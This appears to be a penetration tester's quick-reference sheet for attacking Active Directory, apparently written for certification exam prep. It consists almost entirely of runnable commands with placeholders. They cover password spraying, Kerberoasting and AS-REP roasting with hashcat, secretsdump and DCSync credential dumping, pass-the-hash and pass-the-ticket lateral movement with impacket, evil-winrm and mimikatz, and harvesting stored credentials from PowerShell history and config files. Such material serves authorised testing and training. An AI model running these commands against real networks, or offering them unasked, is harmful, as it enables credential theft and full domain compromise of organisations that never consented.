# AD quick reference

Placeholders: `TARGET` `TARGETS` `DC` `DOMAIN` `USER` `PASS` `NTHASH`  
BoK: assumed-breach enum → auth attacks → lateral → DA/DC ([required-knowledge](../00-exam/required-knowledge-2026.md))

Full flow: [../05-active-directory/decision-flow.md](../05-active-directory/decision-flow.md) · enum: [../05-active-directory/enumeration.md](../05-active-directory/enumeration.md)

## Assumed-breach enum (provided USER:PASS)

```bash
# Auth surfaces + local admin map
nxc smb TARGETS -u USER -p PASS --continue-on-success
nxc smb TARGETS -u USER -p PASS --shares --users --groups --loggedon-users
nxc ldap DC -u USER -p PASS --users --groups --computers
nxc winrm TARGETS -u USER -p PASS --continue-on-success
nxc smb TARGETS -u USER -p PASS -M spider_plus   # if available; else manual shares

# BloodHound CE collector (when allowed / available)
bloodhound-python -d DOMAIN -u USER -p PASS -ns DC -c All --zip
# or SharpHound on a Windows foothold, then import into BloodHound CE
```

```bash
# SYSVOL / scripts (creds, scripts, GPP leftovers)
nxc smb DC -u USER -p PASS --shares
smbclient //DC/SYSVOL -U 'DOMAIN/USER%PASS' -c 'recurse; ls'
# Look under DOMAIN/Policies and scripts for passwords, .xml, .ps1, .bat
```

## Auth test / spray

```bash
nxc smb TARGET -u USER -p PASS
nxc smb TARGETS -u USER -p PASS --continue-on-success
nxc smb TARGETS -u users.txt -p PASS --continue-on-success
nxc smb TARGETS -u USER -H NTHASH --continue-on-success
nxc winrm TARGET -u USER -p PASS
nxc winrm TARGET -u USER -H NTHASH
nxc smb TARGETS -u Administrator -d '.' -H NTHASH --continue-on-success
# After every new secret: re-spray with --continue-on-success
```

## Kerberos prep

```bash
echo "DC_IP dc.DOMAIN DOMAIN" | sudo tee -a /etc/hosts
timedatectl set-ntp 0 && sudo ntpdate DC_IP
export KRB5CCNAME=/tmp/ticket.ccache
```

## Roast

```bash
impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip DC -request -outputfile tgs.txt
impacket-GetNPUsers DOMAIN/USER:PASS -request -dc-ip DC -format hashcat -outputfile asrep.txt
# unauth AS-REP when users list known:
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC -format hashcat -outputfile asrep.txt
hashcat -m 13100 tgs.txt wordlist.txt
hashcat -m 18200 asrep.txt wordlist.txt
```

## Dump / DCSync-class

```bash
impacket-secretsdump DOMAIN/USER:PASS@TARGET
impacket-secretsdump -hashes :NTHASH DOMAIN/USER@TARGET
impacket-secretsdump -just-dc DOMAIN/DA:PASS@DC
impacket-secretsdump -just-dc -hashes :NTHASH DOMAIN/DA@DC
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

## Lateral

```bash
impacket-psexec DOMAIN/USER:PASS@TARGET
impacket-psexec -hashes :NTHASH DOMAIN/USER@TARGET
impacket-wmiexec -hashes :NTHASH DOMAIN/USER@TARGET
impacket-psexec -k -no-pass DOMAIN/USER@HOST.DOMAIN -dc-ip DC
evil-winrm -i TARGET -u USER -p PASS
evil-winrm -i TARGET -u USER -H NTHASH
xfreerdp /v:TARGET /u:DOMAIN\\USER /pth:NTHASH /cert:ignore +clipboard
```

## Tickets (PTT)

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/USER@HOST.DOMAIN -dc-ip DC
```

```text
mimikatz # kerberos::ptt ticket.kirbi
mimikatz # sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell.exe
mimikatz # lsadump::dcsync /domain:DOMAIN /user:krbtgt
```

## History gold (every Windows foothold)

```powershell
type (Get-PSReadlineOption).HistorySavePath
# Also: web.config, unattend, autologon, saved RDP, SAM if SYSTEM
```
